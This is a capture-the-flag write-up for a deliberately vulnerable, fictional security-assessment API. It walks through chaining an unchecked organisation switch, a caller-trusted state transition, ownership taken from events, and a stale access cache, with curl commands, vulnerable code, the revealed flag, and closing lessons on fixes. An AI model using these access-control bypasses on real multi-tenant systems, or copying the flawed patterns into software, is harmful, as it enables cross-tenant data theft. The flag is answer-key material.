# THE LEDGER — Writeup

**Category:** Web (JSON API)
**Difficulty:** Expert / Insane
**Flag format:** `GCDxGLORY{...}` (configurable via the `FLAG` environment variable)
**Objective:** Read the finalised report **Project Nightfall** (`rep_conf_nightfall`).

> The flag lives only in the body of `rep_conf_nightfall`, and is emitted only
> when that report is `READY` **and** the report-access decision for the caller
> is `ALLOW`. Both conditions must be satisfied at the moment of the request.

---

## Scenario

*The Ledger* is a multi-tenant security-assessment platform. Organisations run
projects; projects own assessments; approved assessments produce reports. You
have valid analyst credentials for **Helios Audit Group**. The report you want
— *Project Nightfall* — belongs to **Vantage Confidential** (`TOP_SECRET`), and
its owner is a Vantage manager. Get in and retrieve the flag.

Everything is JSON over HTTP; there is no UI and no OpenAPI document. The API
is discoverable by reading responses and guessing the obvious REST shape.

---

## Stage 0 — Recon

```
POST /api/v1/auth                     -> session token
GET  /api/v1/auth                     -> user, active_org, memberships
GET  /api/v1/sessions
POST /api/v1/sessions/switch          -> change the session's active org
GET  /api/v1/projects                 -> projects (scoped by DEFAULT org)
GET  /api/v1/assessments              -> assessments (scoped by ACTIVE org)  <-- seam
POST /api/v1/jobs                     -> run a workflow action
GET  /api/v1/events, /api/v1/audit
GET  /api/v1/reports, /api/v1/reports/{id}
POST /api/v1/reports/{id}/deliveries
```

Log in:

```bash
TOKEN=$(curl -s http://localhost:8000/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@helios.example","password":"alice-helios-2026"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
AUTH="Authorization: Bearer $TOKEN"
```

`GET /api/v1/auth` shows Alice's single membership: `org_helios`, role
`analyst`. `GET /api/v1/reports` returns nothing (she owns no reports and is
not a manager). The target report is not visible anywhere yet.

---

## Act I — Cross the tenant boundary with the active organisation

`POST /api/v1/sessions/switch` changes **which organisation the session is
acting for**. The name — and the audit record it writes — make it look like a
membership operation. It is not:

```python
# app/routers/identity.py :: switch_active_org
org = db.get(Organization, body.organization_id)
if org is None:
    raise ApiError(404, "unknown_organization", "no such organisation")

principal.session.active_org_id = org.id      # <-- no membership check
```

Alice is not a member of `org_vantage`, yet she can point her session at it:

```bash
curl -s "$BASE/api/v1/sessions/switch" -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"organization_id":"org_vantage"}'
```

Now the **scoping seam** pays off. Two listing endpoints derive tenancy from
two different places:

* `GET /api/v1/projects` scopes by the user's **default** org (`user.default_org_id`) — still Helios.
* `GET /api/v1/assessments` scopes by the session's **active** org — now Vantage.

```bash
curl -s "$BASE/api/v1/projects"    -H "$AUTH" | python3 -c '...'   # organization_id: org_helios
curl -s "$BASE/api/v1/assessments" -H "$AUTH" | python3 -c '...'   # asm_conf, state=READY
```

The assessments listing leaks the target:

```
asm_vantage_api  state=SUBMITTED  report_id=None
asm_conf         state=READY      report_id=rep_conf_nightfall
```

The target report's id is now known. Reading it still fails — correctly:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  "$BASE/api/v1/reports/rep_conf_nightfall" -H "$AUTH"     # 403
```

Alice is neither the owner nor a Vantage manager, so the *authoritative*
decision is DENY. We need to make it ALLOW — and then make it **stay** ALLOW
after the world stops believing it.

---

## Act II — Bypass the state machine with `reported_state`

`asm_conf` is already `READY`. The workflow has a `generate` action that is only
valid from `APPROVED`; running it on a `READY` assessment should be impossible.

```python
# app/services/workflow_service.py :: create_job
TRANSITIONS = {
    "submit":   ("DRAFT",       "SUBMITTED"),
    "approve":  ("SUBMITTED",   "APPROVED"),
    "generate": ("APPROVED",    "GENERATING"),
    "finalize": ("GENERATING",  "READY"),
}
from_state, to_state = TRANSITIONS[action]
actual = assessment.state
...
evaluated = reported_state or actual        # <-- caller-supplied
if evaluated != from_state:                 # <-- validates the REPORTED state
    raise ApiError(409, "invalid_transition", ...)
```

The transition is validated against `evaluated`, which is whatever the caller
sent in `reported_state`. Omitting `reported_state` uses the real state (normal
behaviour); supplying it lets the caller assert a state the assessment is not
in. Tell the server the assessment is `APPROVED`:

```bash
curl -s "$BASE/api/v1/jobs" -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"assessment_id":"asm_conf","action":"generate","reported_state":"APPROVED"}'
```

```json
{"job":{"id":"job_...","reported_state":"APPROVED","actual_state":"READY", ...}}
```

`actual_state` records the truth (`READY`), but the validator was satisfied. The
job completes, the event fires, and the report pipeline reacts.

> Note `POST /api/v1/jobs` resolves `asm_conf` through the **active-org** scope
> (Act I), so the switch is still required. The flaws compose.

---

## Act III — The report service trusts the workflow's ownership claim

The workflow emits `assessment.generate_requested` with an `owner_user_id` in
its payload. The report service **adopts that owner**:

```python
# app/services/report_service.py :: _generate
owner = event.payload.get("owner_user_id") or event.payload.get("requested_by")
...
report.owner_user_id = owner
report.state = "GENERATING"
```

`owner_user_id` is `usr_alice` — the actor who ran the job. The report now
belongs to Alice, and its state is `GENERATING` (content withheld). Reading it
now computes an ALLOW and — crucially — **persists it**:

```python
# app/services/access_cache.py :: decision_for
hit = cached_decision(db, user, report)
if hit is not None:
    return hit.decision, "cache", hit.reason
decision, reason = authoritative_decision(db, user, report)
if decision == ALLOW:
    db.add(AccessDecision(... decision=ALLOW ...)); db.commit()   # <-- cached
return decision, "computed", reason
```

Read the draft (this is the step that seeds the cache):

```bash
curl -s "$BASE/api/v1/reports/rep_conf_nightfall" -H "$AUTH"
```

```json
{"report":{"owner_user_id":"usr_alice","state":"GENERATING",
  "body":"[DRAFT IN PROGRESS ...]",
  "access":{"decision":"ALLOW","source":"computed","reason":"owner"}}}
```

`source` is `computed` (first time), `decision` is `ALLOW`, and the body is the
redacted draft — no flag yet. But an `access_decisions` row now exists for
`(usr_alice, rep_conf_nightfall)`.

---

## Act IV — Finalise, and read through the stale ALLOW

`finalize` is valid from `GENERATING`, which is exactly where Act II left the
assessment, so it runs honestly. This time the report service **re-derives** the
owner from the authoritative assessment instead of trusting the event:

```python
# app/services/report_service.py :: _finalize
report.owner_user_id = assessment.created_by   # usr_dave — the real owner
report.state = "READY"
```

The asymmetry between `_generate` (trust the event) and `_finalize` (trust the
record) is the whole trick: finalising **removes** Alice's ownership, but the
cache is never invalidated.

```bash
curl -s "$BASE/api/v1/jobs" -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"assessment_id":"asm_conf","action":"finalize"}'
```

Now read the report again:

```bash
curl -s "$BASE/api/v1/reports/rep_conf_nightfall" -H "$AUTH"
```

```json
{"report":{"owner_user_id":"usr_dave","state":"READY",
  "body":"... GCDxGLORY{th3_l3dg3r_c4ch3d_d3c1s10n_w1ns} ...",
  "access":{"decision":"ALLOW","source":"cache","reason":"owner"}}}
```

`owner_user_id` is `usr_dave` and the authoritative decision would now be DENY —
but `decision_for` never recomputed. It returned the **cached ALLOW**
(`"source":"cache"`), the state is `READY`, so `render_body` substituted the
flag.

```
GCDxGLORY{th3_l3dg3r_c4ch3d_d3c1s10n_w1ns}
```

---

## The complete chain (raw HTTP)

```http
POST /api/v1/auth
  {"email":"alice@helios.example","password":"alice-helios-2026"}
  -> 200, token

POST /api/v1/sessions/switch
  {"organization_id":"org_vantage"}                       # no membership check
  -> 200

GET  /api/v1/assessments                                  # scoped by active org
  -> 200, includes asm_conf (state READY, report rep_conf_nightfall)

POST /api/v1/jobs
  {"assessment_id":"asm_conf","action":"generate","reported_state":"APPROVED"}
  -> 200, report owner becomes usr_alice, state GENERATING

GET  /api/v1/reports/rep_conf_nightfall                   # seeds the ALLOW cache
  -> 200, access.source=computed, body redacted

POST /api/v1/jobs
  {"assessment_id":"asm_conf","action":"finalize"}
  -> 200, report owner reverts to usr_dave, state READY

GET  /api/v1/reports/rep_conf_nightfall                   # stale cached ALLOW
  -> 200, access.source=cache, body contains the flag
```

### Automated solve

```bash
./solve.sh http://localhost:8000
```

The identical chain is encoded as
`tests/test_full_chain.py::test_full_intended_chain`, which doubles as a CI
regression test.

---

## Why it works — the four interacting flaws

The root cause is one sentence: **the platform makes an access decision from a
cached, once-true fact and never revisits it, and the path that produced that
fact was assembled from three separate trust mistakes.** Each defect is
harmless alone.

### 1. The active-org switch has no membership check — `identity.py`

The session's `active_org_id` is mutable by its owner with no check that the
owner is a member of the target org. Combined with a listing endpoint that
scopes by the *session* org rather than the membership, this is a full
tenant-enumeration primitive. The sibling endpoint (`/projects`) scopes by the
default org, which is what makes the seam non-obvious: one listing respects
membership, the other respects the session.

### 2. The validator validates the reported state — `workflow_service.py`

```python
evaluated = reported_state or actual
if evaluated != from_state: raise ...
```

A client-supplied field decides whether a transition is legal. `actual` is only
used as a fallback and as a display value. Any caller can run any action from
any state by asserting the from-state it expects.

### 3. Event-trusted vs authoritative ownership — `report_service.py`

`_generate` takes `owner_user_id` from the event payload; `_finalize`
re-derives it from `assessment.created_by`. The event is asserted by the
workflow, which (before fix #2) is attacker-influenced. The report service
treats the workflow as a trusted internal caller — a reasonable assumption that
becomes false the moment the workflow's inputs are attacker-controlled.

### 4. The access cache is ALLOW-only and never invalidated — `access_cache.py`

Decisions are cached for performance, only ALLOWs are stored, and no code path
removes a row when `owner_user_id` changes. A decision that was correct at
`t` is returned at `t+1`. The cached row is keyed on `(subject_user_id,
report_id)` and carries a `reason` (`owner`) that is now a lie.

### Any one fix breaks the chain

| Fix | Effect |
|-----|--------|
| Require membership before switching active org | No cross-tenant enumeration; `asm_conf` never discovered |
| Scope every listing by membership (not the session org) | Same — the target stays invisible |
| Validate transitions against `assessment.state`, ignore `reported_state` | `generate` on a READY assessment is rejected (409) |
| Have `_generate` re-derive the owner from the assessment (as `_finalize` does) | The bogus owner is never written; no ALLOW to cache |
| Invalidate cached decisions when ownership changes (or don't cache ALLOWs) | The post-finalise read recomputes DENY |
| Render the body only after recomputing the decision from live state | The stale ALLOW never reaches `render_body` |

That is the intended lesson: a chain of small trust and lifecycle mistakes, each
individually survivable, compounds into full cross-tenant disclosure.

---

## What does *not* work (anti-cheese)

* **Reading the target directly without Act I** → `asm_conf` is not in Alice's
  active-org scope; the job/report returns `404`.
* **Switching org but not running the workflow** → `GET /reports/rep_conf_nightfall`
  is `403` (authoritative DENY: not owner, not a Vantage manager).
* **Running `generate` and `finalize` without the intermediate read** → the
  stale-cache trick needs a *seeded* ALLOW. The report ends up READY and owned
  by `usr_dave`; the read recomputes DENY → `403`
  (`test_chain_requires_seeding_the_cache`).
* **Running `generate` and reading the draft only** → `200`, but the body is the
  redacted draft; the flag requires `state == READY`
  (`test_workflow_alone_does_not_reveal_the_flag`).
* **`generate` without Act I** → the assessment is out of scope (`404`); Carol
  (a Vantage analyst) *can* reach it, but her authoritative decision is always
  DENY, so generating without the identity flaw's ownership adoption gets her
  nothing she can finalise-and-read.
* **Passing a wrong `reported_state`** → still `409`; only the state the action
  actually expects is accepted.
* **Guessing `reported_state` on an unknown action** → `400 unknown_action`.
* **Harvesting other endpoints** (`/reports`, `/assessments`, `/jobs`,
  `/events`, `/audit`, `/deliveries`, `/exports`) → none ever contain the flag
  (`test_unrelated_requests_never_leak_the_flag`).
* **Reading the source** → the flag is not in the repository. `rep_conf_nightfall`
  stores a `{{FLAG}}` placeholder; the real value is injected at render time
  from `FLAG` / `app/config.py::flag()`.
* **Timing or denial games** → decisions are deterministic; the cache stores
  only ALLOWs, so there is no permanent-DENY trap and no timing channel.

---

## Root causes & fixes (lessons learned)

1. **Tenancy must be derived from a single authoritative source.** A user's
   tenancy is their membership, never a mutable per-session preference. If a
   "switch organisation" feature exists, it must verify a membership for the
   target org, and every query must scope by the same membership — not by
   whatever org a listing endpoint happens to read.
2. **Never validate a state transition against client-supplied state.** The
   server owns the current state; the client may name an action, not the state
   it is evaluated against. `reported_state` should not exist, or should be
   display-only.
3. **Trust within a service boundary must be justified end to end.** The report
   service trusted the workflow's ownership claim. That is only safe if the
   workflow's inputs are untainted and its authorisation is real. When two
   internal components disagree about who owns a resource (event claim vs
   authoritative record), the difference is a bug, not a feature.
4. **A cached authorization decision is a security-sensitive object.** It must
   be invalidated on every change to the inputs it was derived from (ownership,
   role, classification), or it must not be cached at all. Caching only the
   permissive answer makes the failure silent and permanent.
5. **Re-check at the moment of disclosure.** The only safe place to answer "may
   this caller read this body?" is immediately before returning the body, from
   live state. A decision that was true when a draft was generated is not a
   decision that the finished secret may be read.
